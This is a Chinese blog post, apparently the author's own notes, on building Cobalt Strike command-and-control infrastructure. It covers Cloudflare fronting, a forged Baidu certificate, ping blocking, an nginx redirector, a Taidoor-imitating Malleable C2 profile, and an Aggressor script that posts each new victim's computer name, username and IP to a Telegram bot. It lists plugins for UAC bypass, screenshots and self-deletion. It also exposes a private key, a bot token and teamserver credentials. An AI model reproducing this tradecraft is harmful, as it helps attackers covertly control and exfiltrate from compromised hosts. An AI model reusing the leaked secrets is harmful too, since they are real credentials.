---
title: 'Cobalt_Strike简单配置'
date: 2025-05-09 19:11 +0800
categories: [tecniq]
tags: []
---

# Cobalt_Strike简单配置

---

## CS服务器配置流程

### 域名与cdn

这里以阿里云域名为例

### 一，在cloudflare中绑定购买的域名

### 二，在阿里云域名管理器中的DNS设置中修改名称服务器为CF提供的地址

![](https://cdn.nlark.com/yuque/0/2025/png/33691709/1742367921132-d51165d8-49a9-448b-bd7b-77f707bcbb1c.png)

成功后截图如下，同时可以ping检测

![](https://cdn.nlark.com/yuque/0/2025/png/33691709/1742368069832-0336ee68-33f8-4f6b-9ed4-d6aa2f917e0a.png)

### 三，CDN配置

- 关闭自动https重写

![](https://cdn.nlark.com/yuque/0/2025/png/33691709/1742368468164-34c25a7c-06e5-4483-ad17-cf9beb278d4e.png)

- 配置ssl/tls为完全模式

![](https://cdn.nlark.com/yuque/0/2025/png/33691709/1742370119966-ca1ac1c5-da94-4241-a405-518aaf470fc6.png)

- 在ssl/tls中选择源服务器，创建证书

![](https://cdn.nlark.com/yuque/0/2025/png/33691709/1742370261128-da8e9c43-d947-407b-84a3-3d3a98f0e075.png)

注意这里的私钥之有生成的时候才能看见，记得及时保存

```
-----BEGIN CERTIFICATE-----
MIIErjCCA5agAwIBAgIUTFyODjTRbYEgQkOKChr8Q89rIB4wDQYJKoZIhvcNAQEL
BQAwgYsxCzAJBgNVBAYTAlVTMRkwFwYDVQQKExBDbG91ZEZsYXJlLCBJbmMuMTQw
MgYDVQQLEytDbG91ZEZsYXJlIE9yaWdpbiBTU0wgQ2VydGlmaWNhdGUgQXV0aG9y
aXR5MRYwFAYDVQQHEw1TYW4gRnJhbmNpc2NvMRMwEQYDVQQIEwpDYWxpZm9ybmlh
MB4XDTI1MDMxOTA3MzkwMFoXDTQwMDMxNTA3MzkwMFowYjEZMBcGA1UEChMQQ2xv
dWRGbGFyZSwgSW5jLjEdMBsGA1UECxMUQ2xvdWRGbGFyZSBPcmlnaW4gQ0ExJjAk
BgNVBAMTHUNsb3VkRmxhcmUgT3JpZ2luIENlcnRpZmljYXRlMIIBIjANBgkqhkiG
9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvhhi1Qb+ptbMpc5MrPy87XGzcMtNnJzVV7kM
DGcsgPTLBDlPHvnHKBGePmUSLzP1Lcs3kj+HXOUkbJeZwFMRnjEYNFFqIYevc93S
ShRcXyKYxNqoWuxLO+uPdKhVkDRgCBWitAFEZYBstM1O2ZdmAMIJzbCACxSJxwbw
oG9rW1n2bCrjUA7zp9nZKuZQSLg2MW3P9H34g48Y6Iwkg/PgB0027lBme0OIAXjQ
YSVIhQCLPX3Ew2Bdv1H0WJv3tVKRrwkYx+ff25HZGMzbVSOdKKuNy2eUkcBjMxq2
S8j+3oIbI+gxYvXfW/KvrPoySkhgHZ6l5wNkzMFD5arvWaTwzwIDAQABo4IBMDCC
ASwwDgYDVR0PAQH/BAQDAgWgMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcD
ATAMBgNVHRMBAf8EAjAAMB0GA1UdDgQWBBSc2N/hzyoVbIJs++oK+QWTzTVCBDAf
BgNVHSMEGDAWgBQk6FNXXXw0QIep65TbuuEWePwppDBABggrBgEFBQcBAQQ0MDIw
MAYIKwYBBQUHMAGGJGh0dHA6Ly9vY3NwLmNsb3VkZmxhcmUuY29tL29yaWdpbl9j
YTAxBgNVHREEKjAoghMqLmRvbmdmYW5nc2h1eWUueHl6ghFkb25nZmFuZ3NodXll
Lnh5ejA4BgNVHR8EMTAvMC2gK6AphidodHRwOi8vY3JsLmNsb3VkZmxhcmUuY29t
L29yaWdpbl9jYS5jcmwwDQYJKoZIhvcNAQELBQADggEBAEhduc6j2/Tjcboz48WT
FgwaBSi7wcIsqPReNvYz1lENA4EocFl9/dGuChu2jKOHhqzRmj4GjMQFK0paOV1Z
iznocRqj+7vEDE23B5YCDXG+mLX9+F0k08Pe7/W46fFmXfKj/xiecUscmQzs0CLB
H9DdJk16EGxHUuk69nooPuiFL0XDXaoVvvnDYnHAULUnMwqYVAGtWQP4CncSOz9r
vmMWP0uhvEdPTWn2qgccXR2rCVpjSUZTPn8ZUkcVxOajDiZjoc7/HhyBgJu+esy0
M29lOtIh4oPxHCu8heLC2hLhCQj8wrr4jeRYh3p2KkimsyCWuxdLL5eEQoYgfVjd
tdQ=
-----END CERTIFICATE-----

```

```
-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC+GGLVBv6m1syl
zkys/LztcbNwy02cnNVXuQwMZyyA9MsEOU8e+ccoEZ4+ZRIvM/UtyzeSP4dc5SRs
l5nAUxGeMRg0UWohh69z3dJKFFxfIpjE2qha7Es76490qFWQNGAIFaK0AURlgGy0
zU7Zl2YAwgnNsIALFInHBvCgb2tbWfZsKuNQDvOn2dkq5lBIuDYxbc/0ffiDjxjo
jCSD8+AHTTbuUGZ7Q4gBeNBhJUiFAIs9fcTDYF2/UfRYm/e1UpGvCRjH59/bkdkY
zNtVI50oq43LZ5SRwGMzGrZLyP7eghsj6DFi9d9b8q+s+jJKSGAdnqXnA2TMwUPl
qu9ZpPDPAgMBAAECggEAGGOX5+L82w+mCVky5zg0o8uPDS1YU3v1DKCLli/KkEUC
oxPDPfh9VSZlhMss48IpIRX4lu/wVbp5y4uWc2F1BN8hpDIUiXbCIP3YaXQRTIzA
yEjm3ruAWjtlGBTc3XfgIPQTAECas4x1kKuNWUdzvoHRW4LbUBCeLgXgQNqVYzkq
iQuYuv+HGB9Orusi6aE7Vv7gZeOyYb33OKiNnckU1FVKCl1bWl0ygyRdf19nrGq/
IEO24MpaYPNGae4CfgjYKZRtJADPOg9aUx0Jw18shSHM/Mgw2ta67fwThB+29VLI
zq6Wp4gbwr7KJH0O3wWSyZwSmiLfMXgnFd4h1MZLIQKBgQDr6XHVp4Juyvfte6OL
prZo81MQS37JSmlSo4X4znX2NUxNNXcaYF2RxBffZaoLziHn0CjGko+vXs/kBiBp
HHIKbfdnLlVOJN9OPiaOUqmFZ0r9+HNc3I3ih8lXcbYZ4O67hFx1W/aKPgGWP1ol
QtM+9x7OYA+Q7rslctIiBzVgnwKBgQDOSDOgJXiYJ+ts+1nPiiSknE7Ua9kmMA3N
8Xy4Ey7wI/Xmg/ZSJur4C8kwcJRiV0Gpo0G3XjvI9Q3ugsHQQfa83eYVU+8WaVEI
UWXxF0YAxP2RcLMInfrIimKg166NWw19B63qQs+IldTb6KGKvPkeX82QZiM2OlXz
pBThkkmR0QKBgFwtR6xKmj0+Eyd4ostjJWzWfkMkrHJsH8EJYcR4r0C3TIvycwoc
UxMsgoNoTsv0C+1uuS/1fizwp9wZxLotQiXvF7b6NJym7ZW91QTRKamVVYjsde73
wnybv8DqDlQIPl+IdTPp7efQGICjWk6q0K2Okzvh7tMbZIZaWd6v4FxTAoGAXODd
fcnhVoEC23sAoRWOEh/ezn4Qs8UHMib9BNR+WdmXKkdYbPzg5vZHi+vko7Kt+fdr
62geewj7UNzG70IEGl2+7vNvvyOEPL6Jq9fSyR3pHccklUisVgcZCVqTWUoZ9KW0
hLm4P8NWp/1CXvlfIXH5WH7kc9IoSR8j17zKK0ECgYEAvYSlTsFI6n6+HrN+JTVa
gwxYG404TWb+H1sa2a7II68ohu6g7H7rBVz6HTuh/hVlFAa8XaonilE/DvHDmcVa
CrVWMp1KQ10ZnyhLf/ARwuOiavEcroU8eoeXbAv9rgtRgOfy6+87VLA/Oo68XNUR
IzDgnlSzKDhdWboCTE5VSlA=
-----END PRIVATE KEY-----

```

- 打包证书

```
  openssl pkcs12 -export -in server.pem -inkey server.key -out www.xxx.tk.p12 -name www.xxx.tk -passout pass:123456
```

- 上传公钥私钥

## 服务器配置

### 服务器禁ping

编辑文件/etc/sysctl.conf，在里面增加一行。net.ipv4.icmp_echo_ignore_all=1

```
vim /etc/sysctl.conf
net.ipv4.icmp_echo_ignore_all=1
sysctl -p
```

### 修改teamserver端口

```
vim teamserver
```

![](https://cdn.nlark.com/yuque/0/2025/png/33691709/1742376114027-da3b0b52-c26d-4bb0-82ba-8573a5828fdd.png)

### 修改默认证书(自己生成证书）

```bash
keytool -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias baidu -dname "CN=baidu.com, OU=service operation department, O=Beijing Baidu Netcom Science Technology Co.\, Ltd, L=beijing, S=beijing, C=CN"
keytool -importkeystore -srckeystore cobaltstrike.store -destkeystore cobaltstrike.store -deststoretype pkcs12
```

```bash
keytool -list -keystore cobaltstrike.store
```

![- 重启cs检查证书是否和生成的一致](https://cdn.nlark.com/yuque/0/2025/png/33691709/1742368290397-ac4f2d9d-23b2-471b-8435-f1fee346d75a.png)

- 重启cs检查证书是否和生成的一致

### 使用CF的证书

使用先前在cdn配置中配置好的公私钥，放置在指定位置，同时打包好放在C2目录下

修改`/etc/nginx/sites-enabled`

```bash
server{
            listen 443 ssl http2;
                server_name dongfangshuye.xyz;
                    root /var/www/https;
                        index index.html;

                            ssl_certificate /opt/zs/server.pem;
                                ssl_certificate_key /opt/zs/server.key;
}

server{
            listen 80;
                server_name dongfangshuye.xyz;

```

修改teamserver

![](https://cdn.nlark.com/yuque/0/2025/png/33691709/1742376442288-b96e9af6-6def-4b0d-9189-e3035224e3e8.png)

### 注意事项

- 免费的CF服务开放的端口有限

```
http:   80、8080、8880、2052、2082、2086、2095
https:  443、2053、2083、2087、2096、8443
```

> https://www.cnblogs.com/backlion/p/17159661.html
> 

---

## 主机上线提示

使用tg机器人推送

1. 在c2目录下写入`tg.cna`

```bash
# author: dayu

# ------------ 设置以下配置 ------------
$bot_token = "8080893168:AAFnS5G1PJj2wmkoIO2PhiiYc08KF4igj-M";
$chat_id = '6183514149';               # 群组 ID 或用户 ID
$teamserver_hostname = 'HOSTNAME-1';   # 将收到包含该主机名的消息
# --------------------------------------

$tg_bot_webhookURL = 'https://api.telegram.org/bot' . $bot_token . '/sendMessage';
$test_message = 'this is a test message, test success';

# 测试消息发送
@curl_command = @(
    'curl', 
    '-X', 'POST',
    '--data-urlencode', 'chat_id=' . $chat_id,
    '--data-urlencode', 'text=' . $test_message,
    $tg_bot_webhookURL
);
exec(@curl_command);

# Beacon 初始回连事件处理
on beacon_initial {
    println("Initial Beacon Checkin: " . $1 . " PID: " . beacon_info($1, "pid"));
    
    local('$internalIP $computerName $userName');
    
    # 获取并格式化信息
    $internalIP   = replace(beacon_info($1, "internal"), " ", "_");
    $computerName = replace(beacon_info($1, "computer"), " ", "_");
    $userName     = replace(beacon_info($1, "user"), " ", "_");

    # 构建 Telegram 消息内容
    $message = 'Message from ' . $teamserver_hostname . ' Server%0a' .
               'Beacon success implant Info Target:%0a' .
               'Computer name : ' . $computerName . '%0a' .
               'Username : ' . $userName . '%0a' .
               'Ipaddres : ' . $internalIP;

    # 构建 curl 命令并发送消息
    @curl_command = @(
        'curl', 
        '-X', 'POST',
        '--data-urlencode', 'chat_id=' . $chat_id,
        '--data', 'text=' . $message,
        $tg_bot_webhookURL
    );
    
    exec(@curl_command);
}

```

1. 运行命令

```bash
./agscript 156.238.233.109 50050 bamuwe bamuwepassword tg.cna
```

---

## BOF插件

1. 进程迁移 https://github.com/ajpc500/BOFs
2. 截图 https://github.com/baiyies/ScreenshotBOFPlus
3. 删除自身 https://github.com/AgeloVito/self_delete_bof
4. bypassuac 提权 https://github.com/youcannotseemeagain/ele

---

## C2特征规避

## 切换管理端口

1. 修改CS_PATH/teamserver里的内容

```bash
root@dkhkkdVlKegcS5:~/C2# vi teamserver
root@dkhkkdVlKegcS5:~/C2# cat teamserver
#!/bin/bash
#
# Start Cobalt Strike Team Server
#

./TeamServerImage -Dcobaltstrike.server_port=65535 -Dcobaltstrike.server_bindto=0.0.0.0 -Djavax.net.ssl.keyStore=./cobaltstrike.store -Djavax.net.ssl.keyStorePassword=123456 teamserver $*
```

## 使用profile

在服务端启动时使用

[https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/APT/taidoor.profile](https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/APT/taidoor.profile)

```bash
set sample_name "Taidoor";

set sleeptime "40000"; # use a ~40 second main interval
set jitter    "35"; # 35% jitter
set maxdns    "255";
set useragent "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)";

http-get {

    set uri "/C2/login.jsp /C2/parse.jsp /C2/page.jsp /C2/default.jsp /C2/index.jsp /C2/process.jsp /C2/security.jsp /C2/user.jsp";
    client {

        header "Connection" "Keep-Aldache";

        # encode session metadata
        metadata {
            netbiosu;
            parameter "mn";
        }
    }

    # no special server side indicators as the report didn't say anything one way

    # or the other about these.
    server {
        header "Server" "Microsoft-IIS/5.0";
        header "Content-Type" "text/html";
        header "Connection" "close";

        output {
            base64;
            prepend "<style>\n";
            prepend "<head>\n";
            prepend "<html dir=ltr>\n";
            prepend "<!DOCTYPE HTML PUBLIC -//W3C//DTD HTML 3.2 Final//EN>\n";
            append "\n</style>\n";
            append "</head>\n";
            append "</html>\n";
            print;
        }
    }
}

http-post {
    set uri "/C2/submit.jsp";

    client {

        header "Connection" "Keep-Alive";
        header "Cache-Control" "no-cache";

        id {
            netbios;
            parameter "du";
        }

        output {
            print;
        }
    }

    server {
        header "Server" "Microsoft-IIS/5.0";
        header "Content-Type" "text/html";
        header "Connection" "close";

        output {
            print;
        }
    }
}

```

手动修改一下路径可以避免大部分假上线

```bash
set sample_name "Taidoor";
set sleeptime "40000"; # use a ~40 second main intervalset jitter    "35"; # 35% jitterset maxdns    "255";
set useragent "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)";
https-certificate {
    set keystore "dongfangshuye.xyz.store";
    set password "123456";
}
http-get {
    set uri "/C2/login.jsp /C2/parse.jsp /C2/page.jsp /C2/default.jsp /C2/index.jsp /C2/process.jsp /C2/security.jsp /C2/user.jsp";
    client {
        header "Connection" "Keep-Alive";
        header "Cache-Control" "no-cache";
        # encode session metadata        metadata {
            netbiosu;
            parameter "mn";
        }
    }
    # no special server side indicators as the report didn't say anything one way    # or the other about these.    server {
        header "Server" "Microsoft-IIS/5.0";
        header "Content-Type" "text/html";
        header "Connection" "close";
        output {
            base64;
            prepend "<style>\n";
            prepend "<head>\n";
            prepend "<html dir=ltr>\n";
            prepend "<!DOCTYPE HTML PUBLIC -//W3C//DTD HTML 3.2 Final//EN>\n";
            append "\n</style>\n";
            append "</head>\n";
            append "</html>\n";
            print;
        }
    }
}
http-post {
    set uri "/C2/submit.jsp";
    client {
        header "Connection" "Keep-Alive";
        header "Cache-Control" "no-cache";
        id {
            netbios;
            parameter "du";
        }
        output {
            print;
        }
    }
    server {
        header "Server" "Microsoft-IIS/5.0";
        header "Content-Type" "text/html";
        header "Connection" "close";
        output {
            print;
        }
    }
}
```

## nginx反向代理

```bash
server{
            listen 443 ssl http2;
                server_name dongfangshuye.xyz;
                    root /var/www/https;
                        index index.html;
                            ssl_certificate /opt/zs/server.pem;
                                ssl_certificate_key /opt/zs/server.key;
}
server{
            listen 80;
                server_name dongfangshuye.xyz;
                    return 301 https://dongfangshuye.xyz;
}
```

## 防止假上线

- 修改端口
- 修改profile
- 修改回连主页为网页

## 禁ping

[https://www.cnblogs.com/backlion/p/17159661.html](https://www.cnblogs.com/backlion/p/17159661.html)